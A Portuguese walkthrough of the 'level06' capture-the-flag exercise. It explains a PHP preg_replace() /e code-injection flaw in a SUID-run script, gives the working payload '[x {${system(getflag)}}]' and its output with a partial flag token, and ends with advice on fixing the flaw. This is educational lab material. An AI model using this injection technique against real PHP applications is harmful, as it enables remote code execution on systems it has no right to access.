# 𝕃𝕖𝕧𝕖𝕝 𝟘𝟞

## 🎯 Objetivo
O objetivo deste nível é explorar uma vulnerabilidade em um script PHP que utiliza expressões regulares de forma insegura, permitindo a execução remota de código (RCE) através da injeção de sintaxe complexa de variáveis.

## 🔍 Análise da Vulnerabilidade
* **Tipo:** *Code Injection* (Injeção de Código) / *PHP preg_replace() `/e` Modifier Vulnerability*.
* **Arquivo Alvo:**
    * `level06` (Executável SUID que atua como ponte).
    * `level06.php` (O script que contém a falha).
* **Comportamento:** Analisando o código fonte do `level06.php`, encontramos a seguinte linha crítica na função `x`:
    ```php
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    ```
    A vulnerabilidade reside no uso do modificador `/e` na função `preg_replace()`. Esse modificador, que foi descontinuado nas versões modernas do PHP por ser extremamente perigoso, faz com que o interpretador avalie a string de substituição como código PHP real.

    Ao enviarmos uma string com a sintaxe complexa de variáveis do PHP `({${funcao()}})`, o interpretador tenta resolver o que está dentro das chaves antes de passar o valor para a função `y()`. Isso nos permite injetar e executar funções do sistema (como o `system()`).

## 💻 Passos para Exploração (Exploit)

1.  **Reconhecimento:**
    Listamos os arquivos e notamos o executável SUID e o script PHP:
    ```bash
    ls -al
    # -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
    # -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
    ```

2.  **Identificação dos Arquivos:**
    ```bash
    file level06
    # level06: setuid ELF 32-bit LSB executable...
    file level06.php
    # level06.php: a /usr/bin/php script, ASCII text executable
    ```

3.  **Análise do Código-Fonte:**
    Lemos o arquivo `.php` e identificamos que ele recebe um arquivo como argumento e processa seu conteúdo utilizando `preg_replace` com o modificador `/e`.
    ```bash
    cat level06.php
    # #!/usr/bin/php
    # <?php
    # function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
    # function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace # ("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
    # $r = x($argv[1], $argv[2]); print $r;
    # ?>
    ```

4.  **Preparação do Payload (Complex Variable Syntax):**
    Criamos um arquivo temporário contendo o nosso payload. O padrão `[x ...]` garante que a nossa string seja capturada pela regex. O miolo `{${system(getflag)}}` utiliza o "Complex (curly) syntax" do PHP.
    Como o PHP com o modificador `/e` avalia o conteúdo dentro de aspas duplas, ele executa a função `system('getflag')` nativamente no sistema operacional para tentar resolver o nome da variável.
    ```bash
    echo '[x {${system(getflag)}}]' > /tmp/get_flag.txt
    ```

5.  **Execução do Exploit:**
    Rodamos o binário SUID (que tem privilégios de `flag06`) passando o nosso arquivo envenenado como parâmetro.
    ./level06 /tmp/get_flag.txt
    # Saída: Check flag.Here is your token : wiok45aaogn...
    ```

## 🚩 Solução / Flag
O interpretador do PHP foi enganado pela sintaxe complexa e executou o comando `getflag` no terminal subjacente, imprimindo o nosso token.

## 🛡️ Prevenção (Como corrigir)
1. **Remoção do Modificador /e**: Nunca utilize o modificador `/e` na função `preg_replace()`. A partir do PHP 5.5.0, esse recurso foi depreciado e, no PHP 7.0.0, foi completamente removido.

2. **Uso de preg_replace_callback()**: A forma moderna e segura de executar lógicas durante substituições de expressões regulares é utilizar a função `preg_replace_callback()`, que recebe uma função anônima ou nomeada segura em vez de executar strings brutas como código.
